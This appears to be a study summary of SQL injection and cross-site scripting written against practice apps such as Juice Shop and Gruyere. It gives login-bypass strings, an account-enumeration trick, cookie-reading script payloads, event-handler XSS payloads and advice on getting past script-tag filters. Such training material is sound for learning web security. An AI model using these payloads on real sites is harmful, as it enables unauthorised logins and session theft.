# SQL Injection & XSS Attack Summary

---

## SQL Injection

### How it works

User input is directly concatenated into a SQL query without sanitization, allowing an attacker to manipulate the query logic. A single quote `'` in an input field is the classic probe — if it causes a server error, the field is injectable.

> **Note:** The password field is often hashed before reaching the query, making it harder to inject there. Always target the email field first.

---

### Login Bypass

Close the string and comment out the rest of the query:

```sql
' OR 1=1--
```

This transforms the query into:

```sql
SELECT * FROM users WHERE email = '' OR 1=1--' AND password = '...'
```

`OR 1=1` makes the query return every user, and the app logs you in as the **first row** — usually the admin.

---

### Login as a Specific User

If you know the target's email, comment out the password check entirely:

```sql
jim@juice-sh.op'--
```

Resulting query:

```sql
SELECT * FROM users WHERE email = 'jim@juice-sh.op'--' AND password = '...'
```

---

### User Enumeration

Log in with a guessed email and a wrong password. Different error messages reveal whether an account exists:

| Response | Meaning |
|----------|---------|
| `"Invalid password"` | Account exists |
| `"User not found"` | Account does not exist |

This is itself a vulnerability — the app should return the same message in both cases.

---


### Key Rules

- `--` comments out everything after it in the query
- `<script>` tags in input fields often get stripped — use event handlers instead (see XSS section)

---

## XSS (Cross-Site Scripting)

### Three Types

| Type | Payload lives in | Goes through server? | Persistent? |
|------|-----------------|----------------------|-------------|
| **Reflected XSS** | URL, reflected in HTTP response | Yes | No |
| **Stored XSS** | Database | Yes | Yes |

---


### Reflected XSS

The payload is sent to the server as part of the request, and the server reflects it back unsanitized in the HTML response.

```
https://google-gruyere.appspot.com/YOUR_ID/<script>alert(document.cookie)</script>
```

Typically delivered as a crafted link sent to a victim.

---

### Stored XSS

The payload is saved in the database and executes for **every user** who loads the page — the most dangerous type. Post in a snippet, review, or comment:

```html
<img src=x onerror="alert('xss')">
```

---

### Stored XSS via HTML Attribute

Inject into a profile or form field that gets rendered inside an HTML attribute. The goal is to break out of the attribute and inject an event handler:

```
" onmouseover="alert('xss')
```

This turns something like `<input value="YOUR_INPUT">` into:

```html
<input value="" onmouseover="alert('xss')">
```

---

### File Upload XSS

Upload a file with a `.html` extension containing:

```html
<script>alert(document.cookie)</script>
```

If the server serves it back with `Content-Type: text/html`, the browser executes it when the file URL is accessed directly.

---

### Why `<script>` Tags Usually Fail

Most frameworks automatically strip `<script>` tags. Use event handlers on legitimate HTML elements instead — much harder to filter:

```html
<img src=x onerror="alert('xss')">       <!-- fires when image fails to load -->
<a onmouseover="alert('xss')">text</a>   <!-- fires on hover -->
```

> **Common mistake:** `document.cookies` does not exist. The correct property is `document.cookie` (no s).
